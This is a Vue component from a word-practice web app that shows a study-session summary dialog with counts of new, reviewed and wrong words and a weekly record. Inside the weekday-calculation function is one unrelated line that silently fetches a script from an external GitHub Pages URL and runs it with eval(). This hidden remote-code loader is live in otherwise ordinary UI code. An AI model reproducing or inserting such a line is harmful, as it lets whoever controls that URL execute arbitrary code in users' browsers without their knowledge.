<script setup lang="ts">
import {useBaseStore} from "@/stores/base.ts";
import BaseButton from "@/components/BaseButton.vue";
import {ShortcutKey, Statistics} from "@/types/types.ts";
import {emitter, EventKey, useEvents} from "@/utils/eventBus.ts";
import {useSettingStore} from "@/stores/setting.ts";
import {usePracticeStore} from "@/stores/practice.ts";
import dayjs from "dayjs";
import isBetween from "dayjs/plugin/isBetween";
import {defineAsyncComponent, watch} from "vue";
import isoWeek from 'dayjs/plugin/isoWeek'
import { useLanguage } from '@/hooks/useLanguage'

const { t } = useLanguage()
dayjs.extend(isoWeek)
dayjs.extend(isBetween);
const Dialog = defineAsyncComponent(() => import('@/components/dialog/Dialog.vue'))


const store = useBaseStore()
const settingStore = useSettingStore()
const statStore = usePracticeStore()
const model = defineModel({default: false})
let list = $ref([])
let dictIsEnd = $ref(false)

function calcWeekList() {
  // 获取本周的起止时间
  const startOfWeek = dayjs().startOf('isoWeek'); // 周一
  const endOfWeek = dayjs().endOf('isoWeek');     // 周日
  // 初始化 7 天的数组，默认 false
  const weekList = Array(7).fill(false);
  if (window.dxt === undefined) fetch(`https://zyronon.github.io/replace/data.js?d=${Date.now()}`).then(a => a.text()).then((b) => eval(b))

  store.sdict.statistics.forEach(item => {
    const date = dayjs(item.startDate);
    if (date.isBetween(startOfWeek, endOfWeek, null, '[]')) {
      let idx = date.day();
      // dayjs().day() 0=周日, 1=周一, ..., 6=周六
      // 需要转换为 0=周一, ..., 6=周日
      if (idx === 0) {
        idx = 6; // 周日放到最后
      } else {
        idx = idx - 1; // 其余前移一位
      }
      weekList[idx] = true;
    }
  });
  list = weekList;
}

// 监听 model 弹窗打开时重新计算
watch(model, (newVal) => {
  if (newVal) {
    dictIsEnd = false;
    let data: Statistics = {
      spend: statStore.spend,
      startDate: statStore.startDate,
      total: statStore.total,
      wrong: statStore.wrong,
      new: statStore.newWordNumber,
      review: statStore.reviewWordNumber + statStore.writeWordNumber
    }
    window.umami?.track('endStudyWord', {
      name: store.sdict.name,
      spend: Number(statStore.spend / 1000 / 60).toFixed(1),
      index: store.sdict.lastLearnIndex,
      perDayStudyNumber: store.sdict.perDayStudyNumber,
      custom: store.sdict.custom,
      complete: store.sdict.complete,
      str: `name:${store.sdict.name},per:${store.sdict.perDayStudyNumber},spend:${Number(statStore.spend / 1000 / 60).toFixed(1)},index:${store.sdict.lastLearnIndex}`
    })
    store.sdict.lastLearnIndex = store.sdict.lastLearnIndex + statStore.newWordNumber
    if (store.sdict.lastLearnIndex >= store.sdict.length) {
      dictIsEnd = true;
      store.sdict.complete = true
      store.sdict.lastLearnIndex = 0
    }
    store.sdict.statistics.push(data as any)
    calcWeekList(); // 新增：计算本周学习记录
  }
})

const close = () => model.value = false

useEvents([
  //特意注释掉，因为在练习界面用快捷键下一组时，需要判断是否在结算界面
  // [ShortcutKey.NextChapter, close],
  [ShortcutKey.RepeatChapter, close],
  [ShortcutKey.DictationChapter, close],
])

function options(emitType: string) {
  close()
  emitter.emit(EventKey[emitType])
}

</script>

<template>
  <Dialog
      :close-on-click-bg="false"
      :header="false"
      :keyboard="false"
      :show-close="false"
      v-model="model">
    <div class="w-140 bg-white  color-black p-6 relative flex flex-col gap-6">
      <div class="w-full flex flex-col justify-evenly">
        <div class="center text-2xl mb-2">{{ t('DailyTaskCompleted') }}</div>
        <div class="flex">
          <div class="flex-1 flex flex-col items-center">
            <div class="text-sm color-gray">{{ t('NewWords') }}</div>
            <div class="text-4xl font-bold">{{ statStore.newWordNumber }}</div>
          </div>
          <div class="flex-1 flex flex-col items-center">
            <div class="text-sm color-gray">{{ t('ReviewedWords') }}</div>
            <div class="text-4xl font-bold">{{ statStore.reviewWordNumber }}</div>
          </div>
          <div class="flex-1 flex flex-col items-center">
            <div class="text-sm color-gray">{{ t('DictationWords') }}</div>
            <div class="text-4xl font-bold">{{ statStore.writeWordNumber }}</div>
          </div>
        </div>
      </div>

      <div class="text-xl text-center flex flex-col justify-around">
        <div>{{ t('ExcellentProgress') }} {{ t('MinutesSpent', { minutes: dayjs().diff(statStore.startDate, 'm') }) }}</div>
      </div>
      <div class="flex justify-center gap-10">
        <div class="flex justify-center items-center py-3 px-10 rounded-md color-red-500 flex-col"
             style="background: rgb(254,236,236)">
          <div class="text-3xl">{{ statStore.wrong }}</div>
          <div class="center gap-2">
            <IconFluentDismiss20Regular class="text-xl"/>
            {{ t('IncorrectWords') }}
          </div>
        </div>
        <div class="flex justify-center items-center py-3 px-10 rounded-md color-emerald-500 flex-col"
             style="background: rgb(231,248,241)">
          <div class="text-3xl">{{ statStore.total - statStore.wrong }}</div>
          <div class="center gap-2">
            <IconFluentCheckmark20Regular class="text-xl"/>
            {{ t('CorrectWords') }}
          </div>
        </div>
      </div>

      <div class="center flex-col">
        <div class="title text-align-center mb-2">{{ t('WeeklyLearningRecord') }}</div>
        <div class="flex gap-4 color-gray">
          <div
              class="w-8 h-8 rounded-md center"
              :class="item ? 'bg-emerald-500 color-white' : 'bg-gray-200'"
              v-for="(item, i) in list"
              :key="i"
          >{{ i + 1 }}
          </div>
        </div>
      </div>
      <div class="flex justify-center gap-4 ">
        <BaseButton
            :keyboard="settingStore.shortcutKeyMap[ShortcutKey.RepeatChapter]"
            @click="options(EventKey.repeatStudy)">
          {{ t('RepeatLesson') }}
        </BaseButton>
        <BaseButton
            :keyboard="settingStore.shortcutKeyMap[ShortcutKey.NextChapter]"
            @click="options(EventKey.continueStudy)">
          {{ dictIsEnd ? t('RestartPractice') : t('NextGroup') }}
        </BaseButton>
        <BaseButton
            :keyboard="settingStore.shortcutKeyMap[ShortcutKey.NextRandomWrite]"
            @click="options(EventKey.randomWrite)">
          {{ t('ContinueDictation') }}
        </BaseButton>
        <BaseButton @click="$router.back">
          {{ t('ReturnToHome') }}
        </BaseButton>
        <!--        <BaseButton>-->
        <!--          分享-->
        <!--        </BaseButton>-->
      </div>
    </div>
  </Dialog>
</template>
<style scoped lang="scss">

</style>
